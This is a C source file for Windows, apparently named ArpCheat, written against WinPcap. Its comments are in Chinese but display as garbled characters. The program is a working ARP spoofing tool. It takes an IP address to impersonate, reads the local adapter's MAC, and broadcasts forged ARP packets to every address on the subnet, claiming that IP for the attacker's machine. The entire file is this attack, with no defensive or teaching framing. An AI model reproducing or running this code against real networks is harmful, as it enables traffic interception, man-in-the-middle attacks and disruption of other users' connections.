
#include <stdio.h>
#include <pcap.h>
#include <conio.h>
#include <packet32.h>
#include <ntddndis.h>
#include "ArpCheat.h"

int main(int argc,char* argv[]){
	pcap_if_t *alldevs;              //ȫ�������б�
    pcap_if_t *d;                    //һ������
    int inum;                        //�û�ѡ����������
    int i=0;                         //ѭ������
    pcap_t *adhandle;                //һ��pcapʵ��
    char errbuf[PCAP_ERRBUF_SIZE];   //���󻺳���
	unsigned char *mac;              //����MAC��ַ
	unsigned char *packet;           //ARP��
	unsigned long fakeIp;            //Ҫαװ�ɵ�IP��ַ
	pcap_addr_t *pAddr;               //������ַ
	unsigned long ip;                //IP��ַ
	unsigned long netmask;           //��������

	if(argc!=2){
		printf("Usage: %s inet_addr\n",argv[0]);
		return -1;
	}

	//�Ӳ����б���Ҫαװ��IP��ַ
	fakeIp = inet_addr(argv[1]);
	if(INADDR_NONE==fakeIp){
		fprintf(stderr,"Invalid IP: %s\n",argv[1]);
		return -1;
	}
    
    /* ��ñ��������б� */
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
    {
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
        exit(1);
    }
    
    /* ��ӡ�����б� */
    for(d=alldevs; d; d=d->next)
    {
        printf("%d", ++i);
        if (d->description)
            printf(". %s\n", d->description);
        else
            printf(". No description available\n");
    }
    //���û�з�������
    if(i==0)
    {
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return -1;
    }
    //���û�ѡ��һ������
    printf("Enter the interface number (1-%d):",i);
    scanf("%d", &inum);
    
	//����û�ѡ���������ų�����Ч��Χ�����˳�
    if(inum < 1 || inum > i)
    {
        printf("\nInterface number out of range.\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }

	

    
    /* �ƶ�ָ�뵽�û�ѡ������� */
    for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);
    
    mac = GetSelfMac(d->name+8); //+8��ȥ��"rpcap://"

	printf("����ARP��ƭ��������(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X) ��ͼαװ��%s\n",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5],argv[1]);



	/* ������ */
    if ( (adhandle= pcap_open(d->name,          // name of the device
                              65536,            // portion of the packet to capture
                              0,                //open flag
                              1000,             // read timeout
                              NULL,             // authentication on the remote machine
                              errbuf            // error buffer
                              ) ) == NULL)
    {
        fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }

	for(pAddr=d->addresses; pAddr; pAddr=pAddr->next){
		//�õ��û�ѡ���������һ��IP��ַ
		ip = ((struct sockaddr_in *)pAddr->addr)->sin_addr.s_addr;
		//�õ���IP��ַ��Ӧ����������
		netmask = ((struct sockaddr_in *)(pAddr->netmask))->sin_addr.S_un.S_addr;
		if (!ip || !netmask){
			continue;
		}
		//�������IP��Ҫαװ��IP�Ƿ���ͬһ������
		if((ip&netmask)!=(fakeIp&netmask)){
			continue; //�������һ������������������ַ�б�
		}

		unsigned long netsize = ntohl(~netmask); //������������
		unsigned long net = ip & netmask; //������ַ
 
		for(unsigned long n=1; n<netsize; n++){
			//��į������IP��ַ�������ֽ�˳��
            unsigned long destIp = net | htonl(n);
			//�����ٵ�ARP��Ӧ�����ﵽ����αװ�ɸ�����IP��ַ��Ŀ��
	        packet = BuildArpPacket(mac,fakeIp,destIp);
			if(pcap_sendpacket(adhandle, packet, 60)==-1){
				fprintf(stderr,"pcap_sendpacket error.\n");
			}
		}
	
	}

	return 0;
}
/**
* ���������MAC��ַ
* pDevName �������豸����
*/
unsigned char* GetSelfMac(char* pDevName){
	
	static u_char mac[6];
	
	memset(mac,0,sizeof(mac));
	
	LPADAPTER lpAdapter =   PacketOpenAdapter(pDevName);
	
	if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE))
	{
		return NULL;
	}

	PPACKET_OID_DATA OidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA));
	if (OidData == NULL) 
	{
		PacketCloseAdapter(lpAdapter);
		return NULL;
	}
	// 
	// Retrieve the adapter MAC querying the NIC driver
	//
	OidData->Oid = OID_802_3_CURRENT_ADDRESS;

	OidData->Length = 6;
	memset(OidData->Data, 0, 6);
	
    BOOLEAN	Status = PacketRequest(lpAdapter, FALSE, OidData);
	if(Status)
	{
		memcpy(mac,(u_char*)(OidData->Data),6);
	}
	free(OidData);
	PacketCloseAdapter(lpAdapter);
	return mac;

}

/**
* ��װARP�����
* source_mac ԴMAC��ַ
* srcIP ԴIP
* destIP Ŀ��IP
*/
unsigned char* BuildArpPacket(unsigned char* source_mac, unsigned long srcIP,unsigned long destIP)
{
	static struct arp_packet packet;
	
	//Ŀ��MAC��ַΪ�㲥��ַ��FF-FF-FF-FF-FF-FF
	memset(packet.eth.dest_mac,0xFF,6);	
	//ԴMAC��ַ
	memcpy(packet.eth.source_mac,source_mac,6);
	//�ϲ�Э��ΪARPЭ�飬0x0806
	packet.eth.eh_type = htons(0x0806);
	
	//Ӳ�����ͣ�Ethernet��0x0001
	packet.arp.hardware_type = htons(0x0001);
	//�ϲ�Э�����ͣ�IPΪ0x0800
	packet.arp.protocol_type = htons(0x0800);
	//Ӳ����ַ���ȣ�MAC��ַ����Ϊ0x06
	packet.arp.add_len = 0x06;
	//Э���ַ���ȣ�IP��ַ����Ϊ0x04
	packet.arp.pro_len = 0x04;
	//������ARP����Ϊ1
	packet.arp.option = htons(0x0001);
	//ԴMAC��ַ
	memcpy(packet.arp.sour_addr,source_mac,6);
	//ԴIP��ַ
	packet.arp.sour_ip = srcIP;
	//Ŀ��MAC��ַ�����0
	memset(packet.arp.dest_addr,0,6);
	//Ŀ��IP��ַ
	packet.arp.dest_ip = destIP;
	//������ݣ�18B
	memset(packet.arp.padding,0,18);

	return (unsigned char*)&packet;

}